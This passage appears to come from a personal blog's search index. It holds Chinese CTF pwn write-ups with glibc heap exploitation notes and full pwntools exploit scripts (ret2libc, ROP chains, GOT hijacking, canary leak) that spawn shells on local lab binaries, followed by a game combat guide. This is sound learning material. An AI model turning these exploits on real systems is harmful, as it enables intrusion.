0x602030 f = malloc(8) = 0x602010图解高版本下的区别libc大于2.27下，引入了tcache，所以需要先把tcache填满(size=7)，然后用calloc申请内存。 calloc不请求tcache0x02 fastbin_dup_into_stack利用条件程序存在double free漏洞目的接着fastbin_dup的思路，point d指向了一个还在fastbins array的chunk，对该chunk写入数据就可以覆盖该fastbin的结构，来获取一个指向任意地址的指针。如果可以对该指针读或者写的话，我们就有了任意地址读/写。步骤 unsigned long long stack_var = 0x20 a = malloc(8);b = malloc(8);c = malloc(8) free(a);free(b);free(a) d = malloc(8) d = (unsigned long long) (((char*)&amp;amp;stack_var) - 8) malloc(8) malloc(8) == ((char*)&amp;amp;stack_var) + 8图解0x03 fastbin_dup_consolidate利用条件程序存在double free漏洞目的fastbins除了在两次free之中加入另外一个free之外,还可以借助large bin中的malloc_consolidate来绕过检查达到double free的目的.达到的效果就是fastbin_dup 64位下，largebin[0] 对应的size=0x410步骤 填满0x50大小的tcache a=calloc(0x40) free(a) b=malloc(0x400) // malloc一个largebin大小的chunk，触发malloc_consolidate，merge到top chunk/unsortedbin free(a) // a和b现在指向同一个chunk，所以可以free(a) c=malloc(0x400) b==c图解0x04 unsafe_unlink利用条件free 的 chunk 前后存在空闲 chunk, 也可以通过溢出值覆盖需要 free 的 chunk 的 P 位, 能控制需要 unlink 的 chunk 的内容. 要free的chunk不能在fastbin范围内，因为fastbin的P位是1，不会触发unlink目的可以对一个全局指针ptr进行内存布局，然后借助unlink操作实现任意地址读写 通常ptr是一个data pointer（意思指向的是chunk 的data部分，所以如果要做unlink利用的话，要伪造整个chunk，而不单单是fake fd和fake bk） 可以利用它去改变其他存在&amp;amp;ptr附近的pointer，然后再利用这些pointer去造成任意地址读写。如果存在function pointer，可以更直接的控制eip步骤 绕过(P-&amp;gt;fd-&amp;gt;bk != P || P-&amp;gt;bk-&amp;gt;fd != P) = False检查 fd = &amp;amp;ptr - 0x18 bk = &amp;amp;ptr - 0x10 绕过(chunksize(P) != prev_size (next_chunk(P)) == False检查 修改对应的prev_inuse和prev_size unlink执行后 ptr = ptr - 0x18 ptr[3]可以修改ptr指向的内容 图解0x05 house_of_spirit利用条件 想要控制的目标区域前后一段都是可控的 存在可以被覆盖的堆指针 一般是在栈上做利用，故需要栈溢出目的覆盖一个堆指针，使其指向可控的区域，构造好相关数据，释放堆指针时会将该区域作为chunk放到fastbin里，再申请这块区域，就可以改写目标区域步骤 伪造堆块，在可控的区域1和2构造数据，将目标区域伪造成一个fastbin chunk 覆盖堆指针指向伪造的fastbin chunk 释放伪造的fastbin chunk到fastbin 申请刚刚释放的chunk，使得可以向目标区域写入数据图解0x06 posion_null_byte见shrink_the_chunk0x07 shrink_the_chunk利用条件存在off-by-one null byte的漏洞目的创造出overlap chunk，进而更改其他chunk的中内容主要利用unlink做合并的特性来达到目的步骤这个步骤意义不大，建议直接看图图解高版本下的区别https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c2.29引入，这个利用用到了unsorted bin，所以也受到了影响。但是上面的利用方式其实已经是对于这个patch的绕过了如果是低版本的glibc，都不用提前在chunk中写那个0x1000x07 entend the chunk利用条件存在off-by-one漏洞目的创造出overlap chunk，进而修改其他chunk的内容进而变成构造任意指针，从而任意地址读写跟shrink很像，但主要是加大size，直接吃掉后面的chunk，只要后面的chunk header有对上就好挖坑中间那个chunk有必要这么大吗？ 需要用到unsorted bin?如果用到unsorted bin，那么也会收到这个patch的影响，（unsorted bin中chunk取出来时会做unlink，就要做prev_size和size的检查）在2.29之后使用受限https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c所以还是那句话，中间那个chunk有必要这么大吗？ 如果不进入unsorted bin，是不是就不会做检查了步骤 A = malloc(0x30); B = malloc(0x160); C = malloc(0x30) free(A) malloc(0x38)， 填入数据，并且触发off-by-one漏洞，修改chunk B的size一字节。使得chunk B的size大小等于chunk B、C总和。size=0x1B1 free(B)，free B的时候会把C顺带着吃掉。然后放入top chunk或者unsorted bin malloc(0x1a0)，造成chunk C的overlap图解house_of_loreoverlapping_chunk同extend_the_chunkoverlapping_chunk2同shrink_the_chunkhouse_of_force高版本下的区别https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=30a17d8c95fbfb15c52d1115803b63aaa73a285c2.29后不可用unsorted_bin_attack高版本下的区别https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c2.29后不可用large_bin_attackhouse_of_einherjartcache_dup高版本下的区别做了double free检测，每个tcache chunk增加了一个key字段，其实就是tcache_perthread_struct指针，释放chunk的时候，会检查当前线程中tcache_perthread_struct是否已经释放过这个chunk，释放过就会crash掉。主要针对tcache dup，不过改掉key就可以绕过tcache_poisoningtcache_house_of_spirithouse_of_botcakehouse_stashing_unlink_attackfastbin_reverse_into_tcachehouse_of_mind_fastbinhouse_of_stormheap编年史 glibc 2.32 引入safe-linking https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/ https://www.anquanke.com/post/id/206457 bypass https://www.researchinnovations.com/post/bypassing-the-upcoming-safe-linking-mitigation https://www.anquanke.com/post/id/207770 https://cloud.tencent.com/developer/article/1643954 2021.8.1 glibc2.34发布，取消了free_hook, malloc_hook, realloc_hook等一众hook全局变量 ​ https://developers.redhat.com/articles/2021/12/17/why-glibc-234-removed-libpthread参考链接 https://github.com/shellphish/how2heap https://bbs.pediy.com/thread-259269.htm" }, { "title": "ctfwiki - stack overflow", "url": "/posts/ctfwiki-stackoverflow/", "categories": "CTF, pwn", "tags": "CTF, pwn", "date": "2022-01-09 14:09:00 +0800", "snippet": "基本ROPCTF wiki上的题目都是32位的，32位的和64位的区别在于 函数参数 X86 函数的参数放在栈上，在函数返回地址的下方(下方是指：返回地址在低地址，参数在高地址) 就像这样调用gets前，将参数（这里是待赋值的变量的地址）压入栈（放在esp上） x64 函数的前6个参数放在寄存器里，其余的才会放在栈上 系统调用 x86 寄存器： %eax, arg0(%ebx), arg1(%ecx), arg2(%edx) .etc 系统调用 int 0x80 x64 寄存器：%rax, arg0(%rdi), arg1(%rsi), arg2(%rbx) .etc 系统调用 syscall ret2text通过debug一下可以看到，实际上s相较于ebp的偏移是0x6c个字节。exp:from pwn import *r = process(&#39;./ret2text&#39;)magic_addr = 0x804863Ar.recvuntil(&#39;anything?\\n&#39;)p = &#39;a&#39;*(0x6c+0x4)+p32(magic_addr)r.sendline(p)r.interactive()ret2shellcodefrom pwn import *r = process(&#39;./ret2shellcode&#39;)r.recvuntil(&#39;!!!\\n&#39;)shell = asm(shellcraft.sh())p = shell.ljust(0x6c+0x4, &#39;a&#39;) + p32(0x0804A080)r.sendline(p)r.interactive()ret2syscallfrom pwn import *r = process(&#39;./rop&#39;)r.recvuntil(&#39;plan to do?\\n&#39;)pop_eax = 0x080bb196 # pop eax ; retpop_edx_ecx_ebx = 0x0806eb90 # pop edx ; pop ecx ; pop ebx ; retint_0x80 = 0x08049421 # int 0x80sh = 0x080be408 # /bin/shp = &#39;a&#39;*(0x6c+0x4)p += p32(pop_edx_ecx_ebx)p += p32(0)p += p32(0)p += p32(sh)p += p32(pop_eax)p += p32(0xb)p += p32(int_0x80)r.sendline(p)r.interactive()ret2libc1from pwn import *r = process(&#39;./ret2libc1&#39;)r.recvuntil(&#39;RET2LIBC &amp;gt;_&amp;lt;\\n&#39;)bin_sh = 0x08048720 # /bin/shsystem = 0x8048460 # &amp;lt;system@plt&amp;gt;p = &#39;a&#39;*(0x6c+0x4)p += p32(system)p += &#39;b&#39;*4p += p32(bin_sh)r.sendline(p)r.interactive()ret2libc2方法2，payload也可以这么写exp:from pwn import *r = process(&#39;./ret2libc2&#39;)elf = ELF(&#39;./ret2libc2&#39;)r.recvuntil(&#39;think ?&#39;)gets_plt = elf.plt[&#39;gets&#39;]system_plt = elf.plt[&#39;system&#39;]_start= elf.symbols[&#39;_start&#39;]bss_addr = 0x804A080pause()p = &#39;a&#39;*(0x6c+0x4)# p += p32(gets_plt)# p += p32(system_plt)# p += p32(bss_addr)# p += p32(bss_addr)p += p32(gets_plt)p += p32(_start)p += p32(bss_addr)r.sendline(p)r.sendline(&#39;/bin/sh&#39;)r.recvuntil(&#39;think ?&#39;)p = &#39;a&#39;*(0x6c+0x4)p += p32(system_plt)p += p32(0xdeadbeef)p += p32(bss_addr)r.sendline(p)r.interactive()ret2libc3Exp:# -*- coding: UTF-8 -*- #from pwn import *from LibcSearcher import *r = process(&#39;./ret2libc3&#39;)elf = ELF(&#39;./ret2libc3&#39;)# 程序开始处，_start可以保证变量在栈上的偏移量不变。# main可能会变，__libc_start_main不清楚_start = elf.symbols[&#39;_start&#39;]# 调用puts，泄露信息，实际是调用puts_pltputs_plt = elf.plt[&#39;puts&#39;] # 企图泄露got表上puts的实际值，也就是puts在libc上的实际地址# 通过LibcSearcher工具，利用泄露的实际地址的最后12位，查询得到libc的版本# libc的版本确定，libc上每个函数的偏移量确定，通过libc基地址算出system等函数的实际地址puts_got = elf.got[&#39;puts&#39;]# 调用gets，向bss写入/bin/shgets_plt = elf.plt[&#39;gets&#39;]# 可写的bss段，程序应该是定义了一个全局变量 char buf2[100]buf = 0x0804A080# 第一轮，泄露puts地址r.recvuntil(&#39;Can you find it !?&#39;)p = &#39;a&#39;*(0x6c+0x4)p += p32(puts_plt)p += p32(_start)p += p32(puts_got)r.sendline(p)puts_addr = u32(r.recvline()[:4])log.success(&#39;puts在libc上的地址: {}&#39;.format(hex(puts_addr)))# 计算得到libc基地址，以及system等函数的地址obj = LibcSearcher(&#39;puts&#39;, puts_addr)puts_offset = obj.dump(&#39;puts&#39;)system_offset = obj.dump(&#39;system&#39;)libc_base = puts_addr - puts_offsetsystem_addr = libc_base + system_offsetlog.success(&#39;libc基地址: {}&#39;.format(hex(libc_base)))log.success(&#39;system地址: {}&#39;.format(hex(system_addr)))# 第二轮，向buf中写入/bin/sh，并调用system(&#39;/bin/sh&#39;)r.recvuntil(&#39;Can you find it !?&#39;)p = &#39;a&#39;*(0x6c+0x4)p += p32(gets_plt)p += p32(system_addr)p += p32(buf)p += p32(buf)r.sendline(p)r.sendline(&#39;/bin/sh&#39;)&#39;&#39;&#39;或者可以将第二轮拆成两轮# 第二轮，向buf中写入/bin/shr.recvuntil(&#39;Can you find it !?&#39;)p = &#39;a&#39;*(0x6c+0x4)p += p32(gets_plt)p += p32(_start)p += p32(buf)r.sendline(p)r.sendline(&#39;/bin/sh&#39;)# 第三轮，调用system(&#39;/bin/sh&#39;)r.recvuntil(&#39;Can you find it !?&#39;)p = &#39;a&#39;*(0x6c+0x4)p += p32(system_addr)p += p32(0xdeadbeef)p += p32(buf)r.sendline(p)&#39;&#39;&#39;r.interactive()中级ROP高级ROP" }, { "title": "NTUSTISC - stack overflow", "url": "/posts/NTUSTISC-stackoverflow/", "categories": "CTF, pwn", "tags": "CTF, pwn", "date": "2021-12-26 14:09:00 +0800", "snippet": "接着上一篇Pwn基础知识，这篇写一下栈溢出的实验小结，分成两个大部分： NTUSTISC视频中留的练习题 CTF WIKI上的stack overflow部分题目Lab0 的 pwntools上手题Return to Text# Lab1#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;void y0u_c4n7_533_m3(){ execve(&quot;/bin/sh&quot;, (char *[]){0}, (char *[]){0});}int main(){ char buf[16]; puts(&quot;This is your first bof challenge ;)&quot;); fflush(stdout); read(0, buf, 0x30); return 0;} 没有栈保护，代码15行读取0x30字节，buffer overflow，覆盖返回地址为y0u_c4n7_533_m3()函数地址即可。 objdump -d bof: # Lab2#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;void y0u_c4n7_533_m3(){ int allow = 0; if (allow) { execve(&quot;/bin/sh&quot;, 0, 0); } else { puts(&quot;Oh no~~~!&quot;); exit(0); }}int main(){ char buf[16]; puts(&quot;This is your second bof challenge ;)&quot;); fflush(stdout); read(0, buf, 0x30); if (strlen(buf) &amp;gt;= 16) { puts(&quot;Bye bye~~&quot;); exit(0); } return 0;} 和第一个基本一样，控制程序执行流return到execve(&quot;/bin/sh&quot;, 0, 0);这一行即可。 第24行的bypass：strlen判断结束为接收到’\\0’位置，所以直接传\\x00就可以bypassstrlen 精准bypass，但是没必要。直接全传\\x00不香🐴 ，都不用算长度Return to Shellcode# Lab3#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;char message[48];int main(){ char name[16]; printf(&quot;Give me your message: &quot;); fflush(stdout); read(0, message, 0x30); printf(&quot;Give me your name: &quot;); fflush(stdout); read(0, name, 0x30); return 0;} 知识点导航：https://siriushsh.github.io/posts/Pwn%E5%85%A5%E9%97%A81-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#return-to-shellcode 没有开NX，所以可以向message中写入shellcode，并且在第15行控制程序执行流跳转到message处，执行shellcode由于没有开PIE，所以程序运行时message所在的地址是不变的，可以通过如下图方式查看验证一波：简单的利用，shellcode就如下图所示，只要把rdi, rsi, rdx设置好，rax设为0x3b，最后调用syscallhttps://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md ,这个网站可以查syscall table 0x68732f6e69622f这个数字就是”/bin/sh”的小端序表示，放进内存后计算机读取时就是/bin/sh，这个数字可以这么获得： 小端序就是 数据的低位存储在内存的低位 或者直接调用pwntools的shellcraft模块exp:from pwn import *r = process(&quot;./ret2sc&quot;)context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)r.recvuntil(&quot;message:&quot;)# sc = &quot;&quot;&quot;# mov rbx, 0x68732f6e69622f# push rbx# mov rdi, rsp# xor rsi, rsi# xor rdx, rdx# mov rax, 0x3b# syscall# &quot;&quot;&quot;# sc = asm(sc, arch=&quot;amd64&quot;)r.send(asm(shellcraft.sh()))r.recvuntil(&quot;name:&quot;)p = &quot;a&quot;*0x18 + p64(0x601060)r.send(p)r.interactive()在做题时想到的一个问题，为什么不能直接用mov rdi,0x68732f6e69622f ，给rdi直接赋值呢，下面这段shellcode实际并不会拿到shell。原因其实也很简单，因为原先rdi等于0，给他附上0x68732f6e69622f后，实际这个是地址的值再对比下正确的方式，注意看x/gx $rdi 和 x/s $rdi, 通过取$rdi地址上存储的数据，得到/bin/shGOT Hijacking# Lab4#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;char name[64];int main(){ int unsigned long long addr; setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); printf(&quot;What&#39;s you name?\\n&quot;); read(0, name, 0x40); printf(&quot;Where do you want to write?\\n&quot;); scanf(&quot;%llu&quot;, &amp;amp;addr); printf(&quot;Data: &quot;); read(0, (char *)addr, 8); puts(&quot;Done!&quot;); printf(&quot;Thank you %s!\\n&quot;, name); return 0;} 知识点：https://siriushsh.github.io/posts/Pwn%E5%85%A5%E9%97%A81-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/#got-hijacking 思路：开了栈保护，没法直接覆盖main的返回地址。可以通过line13 首先向name中写入shellcode（因为没有开NX），然后14行至17行，获取puts的GOT表地址，并且改写puts@got的地址为name的地址。 在第18行，puts(&quot;Done!&quot;);，会去puts@got取地址并执行。(第12行 实际是puts，所以由于lazy binding的关系，puts@got表中已经放入了puts的实际地址，当然后来被我们改写掉了）。exp:from pwn import *r = process(&#39;./gothijack&#39;)context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)r.recvuntil(&#39;name?\\n&#39;)r.send(asm(shellcraft.sh()))puts_got_addr = 0x601018name_addr = 0x601080 #&amp;lt;name&amp;gt;r.recvuntil(&#39;write?\\n&#39;)r.sendline(str(puts_got_addr))r.recvuntil(&#39;Data: &#39;)r.send(p64(name_addr))r.interactive()ROP base# Lab5#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;int main(){ char buf[16]; puts(&quot;This is your first rop challenge ;)&quot;); fflush(stdout); read(0, buf, 0x90); return 0;}这里发现打开了栈保护，但是其实是因为静态链接的关系，把整个glic带进来了，glic里是有canary的。而我们的main程序中是没有的：于是思路就是第10行栈溢出，构造ROP链，覆盖返回值。 使用到的工具 ROPgadget —- ROPgadget --binary ./rop --only &quot;pop|ret&quot;其他的gadgets类似。Exp:from pwn import *r = process(&#39;./rop&#39;)r.recvuntil(&#39;challenge ;)&#39;)bss_addr = 0x6bb2e0pop_rsi = 0x0000000000410093 # pop rsi ; retmov_rdi_rsi = 0x0000000000446c1b # mov qword ptr [rdi], rsi ; retpop_rdi = 0x0000000000400686 # pop rdi ; retpop_rdx = 0x00000000004494b5 # pop rdx ; retpop_rax = 0x0000000000415294 # pop rax ; retsyscall = 0x00000000004011fc # syscallp = &#39;a&#39;*0x18p += p64(pop_rdi)p += p64(bss_addr)p += p64(pop_rsi)p += &#39;/bin/sh\\x00&#39;p += p64(mov_rdi_rsi)p += p64(pop_rsi)p += p64(0)p += p64(pop_rdx)p += p64(0)p += p64(pop_rax)p += p64(0x3b)p += p64(syscall)r.send(p)r.interactive()Return to PLT# Lab6#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;char name[16];int main(){ setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); char buf[16]; system(&quot;echo What is your name?&quot;); read(0, name, 0x10); puts(&quot;Say something: &quot;); read(0, buf, 0x40); return 0;} 思路： 调用system前的ret是为了栈平衡，保持栈的16字节对齐。 若没有ret： 注意此时rsp最后一位是0x8，并没有16字节对齐。16字节对齐就是 rsp指针必须为16的倍数，对应16进制，最后一位应该是0。 需要对齐16字节的原因： 看下去，在这一步之后ni，程序就SIGSEGV了。booom~ 有ret的情况，是stack是16字节对齐的，程序也就不会崩了 知识补充参考：https://www.cxymm.net/article/qq_29328443/107232025exp:from pwn import *r = process(&#39;./ret2plt&#39;)# context.log_level=&quot;debug&quot;raw_input(&quot;&amp;gt;&amp;gt;&quot;)r.recvuntil(&#39;name?&#39;)r.send(&#39;sh\\x00&#39;)r.recvuntil(&#39;something: &#39;)name_addr = 0x601070 # &amp;lt;name&amp;gt;pop_rdi = 0x0000000000400733 # pop rdi ; retret = 0x00000000004004fe # retsystem_plt = 0x0000000000400520 # &amp;lt;system@plt&amp;gt;p = &#39;a&#39;*0x18p += p64(pop_rdi)p += p64(name_addr)p += p64(ret)p += p64(system_plt)r.send(p)r.interactive()Return to libc# Lab7#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;int main(){ setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); char addr[16]; char buf[16]; printf(&quot;You have one chance to read the memory!\\n&quot;); printf(&quot;Give me the address in hex: &quot;); read(0, addr, 0x10); unsigned long long iaddr = strtoll(addr, 0, 16); printf(&quot;\\nContent: %lld\\n&quot;, *(unsigned long long *)iaddr); printf(&quot;Give me your messege: &quot;); read(0, buf, 0x90); return 0;}strings -t x ./libc-2.27.so| grep &quot;/bin/sh&quot;1b3e9a /bin/shROPgadget --binary ./libc-2.27.so --string &quot;/bin/sh&quot;0x00000000001b3e9a : /bin/shreadelf -a ./libc-2.27.so | grep &quot;system&quot; 232: 0000000000159e20 99 FUNC GLOBAL DEFAULT 13 svcerr_systemerr@@GLIBC_2.2.5 607: 000000000004f440 45 FUNC GLOBAL DEFAULT 13 __libc_system@@GLIBC_PRIVATE 1403: 000000000004f440 45 FUNC WEAK DEFAULT 13 system@@GLIBC_2.2.5 readelf -a ./libc-2.27.so | grep &quot;system&quot; 191: 00000000000809c0 512 FUNC GLOBAL DEFAULT 13 _IO_puts@@GLIBC_2.2.5 422: 00000000000809c0 512 FUNC WEAK DEFAULT 13 puts@@GLIBC_2.2.5 496: 00000000001266c0 1240 FUNC GLOBAL DEFAULT 13 putspent@@GLIBC_2.2.5 678: 00000000001285d0 750 FUNC GLOBAL DEFAULT 13 putsgent@@GLIBC_2.10 1141: 000000000007f1f0 396 FUNC WEAK DEFAULT 13 fputs@@GLIBC_2.2.5 1677: 000000000007f1f0 396 FUNC GLOBAL DEFAULT 13 _IO_fputs@@GLIBC_2.2.5 2310: 000000000008a640 143 FUNC WEAK DEFAULT 13 fputs_unlocked@@GLIBC_2.2.5 ROPgadget --binary ./ret2libc --only &quot;pop|ret&quot; | grep &quot;rdi&quot;0x00000000004007d3 : pop rdi ; retexp:from pwn import *r = process(&#39;./ret2libc&#39;, env={&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;})# context.log_level=&quot;debug&quot;# raw_input(&quot;&amp;gt;&amp;gt;&amp;gt;&quot;)puts_got_addr = 0x0000000000601018 # R_X86_64_JUMP_SLOT ts@GLIBC_2.2.5puts_libc_offset = 0x00000000000809c0 # 512 FUNC GLOBAL FAULT 13 _IO_puts@@GLIBC_2.2.5sh_offset = 0x00000000001b3e9a # /bin/shsystem_libc_offset = 0x000000000004f440 # 45 FUNC WEAK FAULT 13 system@@GLIBC_2.2.5# pop_rdi = 0x00000000004007d3 # pop rdi ; retpop_rdi_libc_offset = 0x000000000002155f # pop rdi ; retret = 0x000000000040053e # retr.recvuntil(&#39;hex: &#39;)r.send(hex(puts_got_addr))r.recvuntil(&#39;Content: &#39;)puts_libc_addr = int(r.recvline())log.success(&quot;puts addr: {}&quot;.format(hex(puts_libc_addr)))r.recvuntil(&#39;messege: &#39;)libc_base_addr = puts_libc_addr - puts_libc_offsetp = &#39;a&#39;*0x38p += p64(libc_base_addr + pop_rdi_libc_offset)p += p64(libc_base_addr + sh_offset)p += p64(ret)p += p64(libc_base_addr + system_libc_offset)r.send(p)r.interactive()使用one_gadget# lab8#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;int comp(const void *lhs, const void *rhs){ long long f = *((long long *)lhs); long long s = *((long long *)rhs); if (f &amp;gt; s) return 1; if (f &amp;lt; s) return -1; return 0;}int main(){ setvbuf(stdout, 0, 2, 0); setvbuf(stdin, 0, 2, 0); char name[16]; //[rbp-20h] long long arr[10000]; //[rbp-138A0h] int size; puts(&quot;Welcome to the sorting service!&quot;); puts(&quot;Please enter array size (1~10000):&quot;); scanf(&quot;%d&quot;, &amp;amp;size); puts(&quot;Please enter the array:&quot;); for (int i = 0; i &amp;lt; size; ++i) { long long temp; scanf(&quot;%lld&quot;, &amp;amp;temp); if (temp &amp;gt;= 0) { arr[i] = temp; } } qsort(arr, size, sizeof(long long), comp); puts(&quot;Here is the result&quot;); for (int i = 0; i &amp;lt; size; ++i) { printf(&quot;%lld &quot;, arr[i]); } puts(&quot;&quot;); puts(&quot;Please leave your name:&quot;); read(0, name, 0x90); puts(&quot;Thank you for using our service!&quot;);} 总的思路是 通过给一个很大的size，利用36行把栈里的数据都给打印出来。 有两个数据比较关键： rbp-0x8是canary，因为后续还要利用read(0, name, 0x90);这行的栈溢出，所以要先搞到canary，再栈溢出利用的时候把canary再塞回去，保证canary的check检查通过 rbp+0x8是__libc_start_main+231, 拿到这个值，再减去231，就是__libc_start_main的实际地址了，__libc_start_main的实际地址减去__libc_start_main的offset（从readelf或者elf.symbols获取），就可以得到libc的基地址了。 不过好像成功率就一半，有时候只能搞到2个值，也不知道是为啥，这种情况就GG了exp:from pwn import *r = process(&#39;./sort&#39;, env={&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;})libc = ELF(&#39;./libc-2.27.so&#39;)# context.log_level=&quot;debug&quot;# pause()r.recvuntil(&quot;(1~10000):&quot;)size = (0x138A0/8+2)r.sendline(str(size))r.recvuntil(&#39;array:\\n&#39;)for i in range(size): if i &amp;lt; (size-3): r.sendline(str(0)) else: r.sendline(str(-1))r.recvuntil(&#39;result\\n&#39;)arr = r.recvline().split(&#39; &#39;)print(arr[-5:])canary = int(arr[-2])libc_start_main = int(arr[-3]) - 231libc_start_main_offset = libc.symbols[&#39;__libc_start_main&#39;]libc_base = libc_start_main - libc_start_main_offset# pause()# print(hex(canary))r.recvuntil(&#39;name:&#39;)pop_rdi = 0x000000000002155f # pop rdi ; retret = 0x00000000000008aa # retsh = 0x00000000001b3e9a # /bin/shsystem_libc_offset = libc.symbols[&#39;system&#39;]p = &#39;a&#39;*(8*3) + p64(canary) + &#39;a&#39;*8p += p64(libc_base + pop_rdi)p += p64(libc_base + sh)p += p64(libc_base + ret)p += p64(libc_base + system_libc_offset)# one_gadget# p += p64(libc_base + 0x4f322)r.send(p)r.interactive()" }, { "title": "pwn basic", "url": "/posts/pwn-basic/", "categories": "CTF, pwn", "tags": "CTF, pwn", "date": "2021-12-25 11:04:00 +0800", "snippet": "入门材料现在还蛮多的，看书《从0到1 CTFer成长之路》《CTF特训营》，网站ctfwiki都可以，但是我还是安利一下我觉得很好的入门视频链接：https://www.youtube.com/watch?v=8zO47WDUdIk真的从0开始教，适合我这样的小白入门，这里粘一下他slide里的知识点useful toolsBinary Formatx64 Calling Conventionhttps://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frameStack FrameFunction PrologureFunction Epilogueleave = mov rsp, rbp &amp;amp; pop rbpBuffer Overflow利用Return To Text覆盖return addrReturn To Shellcode Linux syscalls: https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.mdProtectionStack Guard 穿插一句，canary的值可以通过 pwngdb插件的tls命令获得 DEPASLR &amp;amp; PIEGOT HijackingLazy BindingGOTLazy Binding Proceduce第一次调用&amp;lt;puts@plt&amp;gt;表，会将puts的真实地址写到GOT表里第二次调用&amp;lt;puts@plt&amp;gt;表时，就直接拿到puts的真实地址了。 热知识：C语言里printf如果带\\n，汇编里实际是调用putsGOT HijackingRELROROPReturn to PLTReturn to libc https://github.com/niklasb/libc-database https://github.com/lieanu/LibcSearchersummary基础知识记录。用来查阅忘记的知识点的话，还是可以的，能够帮助回想起来。" }, { "title": "异度之刃1战斗系统攻略", "url": "/posts/%E5%BC%82%E5%BA%A6%E4%B9%8B%E5%88%831%E6%88%98%E6%96%97%E7%B3%BB%E7%BB%9F%E6%94%BB%E7%95%A5/", "categories": "游戏", "tags": "游戏", "date": "2021-12-20 21:11:00 +0800", "snippet": " 本文首发于NGA，发表时间2020.06.14，游戏刚发售时。本文只是重新做下记录。 异度之刃系列算是这几年来，我最喜欢的RPG了，尤其是一代，我对这个战斗系统真的是爱死了，但是国内玩家基本没人可以感受到他的牛逼之处，这也就诞生了这一篇攻略。 首先本文使用的所有数据及公式均出自日站wiki以及大神authurzhen整理。0x01 序言“为什么我老是MISS”，“我根本打不中怪啊”，这可能是大家在异度1里经常遇到的一个问题，这是不是游戏有问题呢。本篇文章的前两章就带大家来分析其中的根本原因，并从第四章开始一步一步讲解如何实现越级打怪。首先本人目前位于游戏11章，所以越级是中期就可以实现的。0x02 等级修正以及命中率公式打不过怪说白了就是命中率太低了，当你没有做任何准备就挑战6级以上的怪物可能导致命中率直接为0%。异度1的物理命中率公式如下：己方物理命中率= 100+自身战时敏捷-敌方战时敏捷+战技等级修正+士气修正-int(重量/4)+LV差敏捷修正+物理命中其他修正不想看详细分析的可以直接看下一章节的总结。剖析下公式中的每一项，首先基础命中率为100%，后续各项均为修正项 自身战时敏捷 既然提到了战时敏捷，那肯定有常时敏捷了，两个公式如下： 常时敏捷=[自身敏捷+宝石加值+性格本质加值+常时发动性格加值-max(防具总重量—性格抵消重量修正，0)]*(1+常时发动性格倍率) 战时敏捷=[自身+宝石加值+性格本质加值+常时发动性格加值-max(防具总重量—性格抵消重量修正，0)]*(1+常时发动性格倍率+战斗发动战技倍率+战斗发动性格倍率)+战时发动战技加值 PS. 决定版中装备重量不会直接影响常时敏捷，故为了便于理解，人物装备都修正为0了。 通俗的来讲，常时敏捷就是平时的面板值，如图修尔克的常时敏捷为196而战时敏捷就是在常时敏捷的基础上乘以修正项，常用的修正项有修尔克直觉2[向强者挑战]的对强敌开战15%，莱茵努力2[针对强敌]的对强敌开战5%，丹邦洒脱2[极限看破]的半血15%以及力奇(隐藏)胆小2[很危险啊嗼]的半血20%。那么修尔克进入战斗后的前30秒的敏捷为196*(1+0.15+0.05+0.15+0.2)等于303.8 敌方战时敏捷本文敌人素材均使用巨神脚的贪食猩猩兽可以看到猩猩的敏捷是111 战技等级修正战技等级修正等于战技等级*5，此时我们的战技一般是7级，所以修正值等于35。而天赋技一律为25。 士气修正 LV差敏捷修正这一项是影响最大的一项，详细见图：当等级差值在5级时敏捷修正-40，差值在6级时修正为-120，是一个非常大的分水岭。等级差值大于10级后，修正值达到最大值-200。 物理其他修正这一项最常用的就是夜间命中宝石，LV4的夜间命中宝石最大属性是34%命中，插两颗可以达到最大值50%。而倒地的敌方必定命中，也是倒地流可以成立的前提条件。0x03 做一个小总结物理命中率公式可以简化为100 + 等级修正 + (敏捷差值) + (技能等级*5) -(重量/4)+ 夜间命中50敏捷宝石拉满并带上夜间命中宝石是每个人都能想到的，但是很多人还是困惑为什么我还是老miss，让我们来计算一下： 最基础的68级的修尔克，敏捷和夜间命中拉满，常时敏捷是156。(图片上196=156+修尔克直觉15+卡尔纳10+梅里亚15)此时命中率：100-200+(156 - 111) + 35 + 50 = 30%。可以看到敏捷拉满，再带上夜间命中，并没有达到预想的效果。 进一步，我们知道了常时敏捷的重要性于是我们加上修尔克直觉15+卡尔纳10+梅里亚15，常时敏捷达到196此时命中率：100-200+(196 - 